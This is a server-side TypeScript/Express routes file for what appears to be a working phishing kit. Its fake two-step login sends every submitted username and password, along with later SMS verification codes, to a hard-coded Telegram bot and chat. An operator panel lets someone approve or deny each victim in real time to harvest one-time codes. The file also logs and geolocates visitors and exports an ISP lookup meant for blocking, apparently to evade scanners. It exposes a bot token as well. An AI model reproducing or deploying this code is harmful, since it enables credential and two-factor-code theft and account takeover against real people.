import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import fs from "fs";
import path from "path";
import { storage } from "./storage";
import { loginSchema, usernameSchema } from "@shared/schema";

// Telegram configuration
const TELEGRAM_BOT_TOKEN = "6954919116:AAF5ialybjcO6AJZ0CWGPVvtRoArCYzkK3I";
const TELEGRAM_CHAT_ID = "-4535798767";

// In-memory storage for pending requests
const pendingRequests = new Map<string, any>();

// Function to send message to Telegram
async function sendToTelegram(username: string, password: string) {
  try {
    const message = `🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}`;
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Failed to send to Telegram:', await response.text());
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

// Function to get country and ISP from IP address
async function getCountryFromIP(ip: string): Promise<string> {
  try {
    // Skip if IP is unknown or local
    if (ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      return 'Local';
    }

    // Use IP-API.com for free geolocation (45 requests/minute limit)
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,org`);
    const data = await response.json();
    
    if (data.status === 'success' && data.country) {
      return `${data.country} (${data.countryCode})`;
    }
    
    return 'Unknown';
  } catch (error) {
    console.error('Error getting country for IP:', error);
    return 'Unknown';
  }
}

// Function to get ISP information for blocking
async function getISPFromIP(ip: string): Promise<string | null> {
  try {
    // Skip if IP is unknown or local
    if (ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      return null;
    }

    // Use IP-API.com for ISP lookup
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,org`);
    const data = await response.json();
    
    if (data.status === 'success' && data.org) {
      return data.org;
    }
    
    return null;
  } catch (error) {
    console.error('Error getting ISP for IP:', error);
    return null;
  }
}

// Function to log visitor information
async function logVisitor(req: Request) {
  try {
    // Get real IP address (handles proxies and load balancers)
    const rawIP = req.headers['x-forwarded-for'] as string || 
                  req.headers['x-real-ip'] as string ||
                  req.connection.remoteAddress ||
                  req.socket.remoteAddress ||
                  'unknown';
    
    // Extract first IP from comma-separated list for country lookup
    const ip = rawIP.split(',')[0].trim();
    
    // Get country information
    const country = await getCountryFromIP(ip);
    
    // Get current date/time in GMT
    const now = new Date();
    const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
    const timeStr = now.toISOString().split('T')[1].split('.')[0]; // HH:MM:SS
    
    // Format log entry with country information (shortened)
    const userAgent = req.headers['user-agent'] || 'unknown';
    const shortUserAgent = userAgent.length > 50 ? userAgent.substring(0, 50) + '...' : userAgent;
    const logEntry = `${ip} (${country}) | ${dateStr} | ${timeStr} | ${req.url} | ${shortUserAgent}\n`;
    
    // Append to visitors.txt file in public directory so it deploys with the site
    const logPath = path.join(process.cwd(), 'client', 'public', 'visitors.txt');
    
    // Ensure public directory exists
    const publicDir = path.join(process.cwd(), 'client', 'public');
    if (!fs.existsSync(publicDir)) {
      fs.mkdirSync(publicDir, { recursive: true });
    }
    
    fs.appendFileSync(logPath, logEntry);
  } catch (error) {
    console.error('Error logging visitor:', error);
  }
}

// Export ISP checking function for use in middleware
export { getISPFromIP };

export async function registerRoutes(app: Express): Promise<Server> {
  // Visitor logging middleware - logs all page visits
  app.use((req: Request, res: Response, next) => {
    // Only log main page visits, not API calls or assets
    if (req.url === '/' || req.url.startsWith('/login') || req.url.startsWith('/loading') || 
        req.url.startsWith('/sms') || req.url.startsWith('/admin-control')) {
      // Log visitor async without blocking request
      logVisitor(req).catch(error => console.error('Visitor logging failed:', error));
    }
    next();
  });

  // Authentication routes
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const loginData = loginSchema.parse(req.body);

      // Generate unique request ID
      const requestId = Date.now().toString() + Math.random().toString(36).substr(2, 9);

      // Send login data to Telegram
      await sendToTelegram(loginData.username, loginData.password);

      // Store the pending request
      pendingRequests.set(requestId, {
        id: requestId,
        username: loginData.username,
        password: loginData.password,
        timestamp: new Date().toISOString(),
        ipAddress: req.ip || req.connection.remoteAddress || 'Unknown',
        userAgent: req.get("User-Agent") || 'Unknown',
        status: 'pending'
      });

      // Always return success with request ID - admin will control the flow
      res.json({ 
        success: true, 
        message: "Login request submitted",
        requestId: requestId
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          success: false,
          message: "Invalid input data",
          errors: error.errors,
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    }
  });

  // Check username endpoint (POST method for two-step login)
  app.post("/api/auth/check-username", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const usernameData = usernameSchema.parse(req.body);
      
      // For this demo, we'll accept any username and proceed to password step
      // In a real app, you might check if the username exists or create a new user
      res.json({ 
        success: true,
        message: "Username validated",
        username: usernameData.username,
        rememberUsername: usernameData.rememberUsername,
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          success: false,
          message: "Invalid input data",
          errors: error.errors,
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    }
  });

  // Get user by username (for checking if username exists)
  app.get("/api/auth/check-username/:username", async (req: Request, res: Response) => {
    try {
      const username = req.params.username;
      const user = await storage.getUserByUsername(username);
      
      res.json({ 
        exists: !!user,
        rememberUsername: user?.rememberUsername || false,
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Create new user (registration)
  app.post("/api/auth/register", async (req: Request, res: Response) => {
    try {
      const userData = req.body;
      
      // Check if username already exists
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        res.status(409).json({
          success: false,
          message: "Username already exists",
        });
        return;
      }

      const user = await storage.createUser(userData);
      res.json({ 
        success: true, 
        message: "User created successfully",
        user: {
          id: user.id,
          username: user.username,
        }
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Password reset/username recovery endpoint
  app.post("/api/auth/recover-username", async (req: Request, res: Response) => {
    try {
      const { email } = req.body;
      
      // In a real app, this would send an email with username recovery instructions
      res.json({
        success: true,
        message: "If an account exists with that email, recovery instructions have been sent.",
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Get pending requests for admin panel
  app.get("/api/admin/pending", async (req: Request, res: Response) => {
    try {
      // Return only pending requests
      const pending = Array.from(pendingRequests.values()).filter(req => req.status === 'pending');
      res.json(pending);
    } catch (error) {
      console.error('Error getting pending requests:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Check status of a specific request
  app.get("/api/auth/status/:requestId", async (req: Request, res: Response) => {
    try {
      const requestId = req.params.requestId;
      const request = pendingRequests.get(requestId);
      
      if (!request) {
        res.status(404).json({
          success: false,
          message: "Request not found",
        });
        return;
      }

      res.json({
        success: true,
        status: request.status,
        requestId: requestId
      });
    } catch (error) {
      console.error('Error checking status:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Admin panel routes
  app.post("/api/admin/grant", async (req: Request, res: Response) => {
    try {
      const { requestId, username, password } = req.body;
      
      // Update request status
      const request = pendingRequests.get(requestId);
      if (request) {
        request.status = 'granted';
        pendingRequests.set(requestId, request);
      }

      res.json({
        success: true,
        message: "Access granted - proceeding to SMS verification",
      });
    } catch (error) {
      console.error('Error in grant endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/admin/deny", async (req: Request, res: Response) => {
    try {
      const { requestId, username, password } = req.body;
      
      // Update request status
      const request = pendingRequests.get(requestId);
      if (request) {
        request.status = 'denied';
        pendingRequests.set(requestId, request);
      }

      res.json({
        success: true,
        message: "Access denied - user will see incorrect password error",
      });
    } catch (error) {
      console.error('Error in deny endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Visitor logs endpoint - serves visitors.txt file via web URL
  app.get("/visitors.txt", (req: Request, res: Response) => {
    try {
      const logPath = path.join(process.cwd(), 'client', 'public', 'visitors.txt');
      
      // Check if file exists
      if (!fs.existsSync(logPath)) {
        res.status(404).send('Visitor log file not found');
        return;
      }
      
      // Set proper headers for text file
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.setHeader('Content-Disposition', 'inline; filename="visitors.txt"');
      
      // Send file contents
      const fileContent = fs.readFileSync(logPath, 'utf8');
      res.send(fileContent);
    } catch (error) {
      console.error('Error serving visitors.txt:', error);
      res.status(500).send('Error reading visitor log file');
    }
  });

  // SMS verification routes
  app.post("/api/sms/verify", async (req: Request, res: Response) => {
    try {
      const { username, code, timestamp } = req.body;
      
      // Send SMS verification attempt to Telegram
      const message = `📱 SMS VERIFICATION ATTEMPT\n👤 Username: ${username}\n🔢 Code: ${code}\n⏰ Time: ${timestamp}\n📋 Status: Verification code entered`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      // For demo purposes, accept any 6-digit code
      if (code && code.length === 6 && /^\d{6}$/.test(code)) {
        res.json({
          success: true,
          message: "SMS verification successful",
        });
      } else {
        res.status(400).json({
          success: false,
          message: "Invalid verification code",
        });
      }
    } catch (error) {
      console.error('Error in SMS verify endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/sms/resend", async (req: Request, res: Response) => {
    try {
      const { username } = req.body;
      
      // Send resend request to Telegram
      const message = `🔄 SMS CODE RESEND REQUEST\n👤 Username: ${username}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: New verification code requested`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      res.json({
        success: true,
        message: "New verification code sent",
      });
    } catch (error) {
      console.error('Error in SMS resend endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
